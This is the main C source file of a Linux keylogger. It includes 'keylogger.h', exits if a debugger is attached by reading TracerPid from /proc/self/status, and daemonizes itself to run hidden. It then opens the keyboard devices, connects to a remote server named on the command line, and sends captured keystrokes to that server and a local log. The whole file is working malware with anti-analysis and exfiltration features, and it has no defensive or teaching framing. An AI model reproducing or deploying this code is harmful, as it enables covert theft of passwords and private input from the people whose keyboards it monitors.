
#include "keylogger.h"
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <signal.h>

static void daemonize(void)
{
    pid_t pid = fork();

    check_pid_status(pid);
    if (setsid() < 0) // child should become session leader
        exit(1);
    pid = fork();
    check_pid_status(pid);
    umask(0); // setting correct file permissions
    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) // closing open file desc
        close(x);
}

static void setup_signals(void)
{
    struct sigaction sa = {
        .sa_handler = sigchild_handler,
        .sa_flags = SA_RESTART
    };
    struct sigaction sigtrap = {
        .sa_handler = sigtrap_handler,
        .sa_flags = SA_RESTART
    };

    sigemptyset(&sa.sa_mask);
    sigaction(SIGCHLD, &sa, 0x0);
    sigemptyset(&sigtrap.sa_mask);
    sigaction(SIGTRAP, &sigtrap, 0x0);
}

bool debugger_is_attached(void)
{
    char buf[4096];

    const int status_fd = open("/proc/self/status", O_RDONLY);
    if (status_fd == -1)
        return false;

    const ssize_t num_read = read(status_fd, buf, sizeof(buf) - 1);
    if (num_read <= 0)
        return false;

    buf[num_read] = '\0';
    const char tracer_pid[] = "TracerPid:";
    const char *tracer_pid_ptr = strstr(buf, tracer_pid);
    if (!tracer_pid_ptr)
        return false;

    for (const char* char_ptr = tracer_pid_ptr + sizeof(tracer_pid) - 1; char_ptr <= buf + num_read; ++char_ptr)
    {
        if (isspace(*char_ptr))
            continue;
        else return isdigit(*char_ptr) != 0 && *char_ptr != '0';
    }

    return false;
}

int main(int ac, char **av)
{
    if (debugger_is_attached())
        return 1;

    daemonize();
    setup_signals();
    int logfd = setup_log();

    int *keyboards = get_keyboard_paths(logfd);
    int sockfd = connect_to_srv(ac == 1 ? 0x0 : av[1], logfd);
    if (!keyboards || (sockfd == -1 && logfd == -1))
        return 1;

    log_keys(keyboards, sockfd, logfd);
    for (int i = -1; keyboards[++i] != -1;)
        close(keyboards[i]);
    free(keyboards);

    close(sockfd);
    close(logfd);
    return 0;
}

